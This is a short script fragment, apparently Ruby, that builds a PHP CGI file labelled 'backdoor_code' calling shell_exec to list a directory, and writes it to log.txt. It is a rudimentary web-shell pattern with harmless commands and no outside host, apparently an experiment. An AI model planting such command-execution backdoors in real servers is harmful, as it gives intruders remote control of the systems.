backdoor_code = '#!"C:\\xampp\\php\\php.exe"\n<?php\necho "Content-type: text/plain; charset=iso-8859-1\n\n";\necho shell_exec("dir");\n?>'

# "#!\"C:\\Users\\kiwog\\AppData\\Local\\Programs\\Python\\Python39\\python.exe\"\n\nimport os\n\nprint(\"Content-type: text/plain; charset=iso-8859-1\\n\\n\")\n"

code = "#!\"C:\\xampp\\php\\php.exe\"\n<?php\n\techo \"Content-type: text/plain; charset=iso-8859-1\\n\\n\";\n\techo shell_exec(\"" + "ls" + "\");\n?>"

File.write("log.txt", code)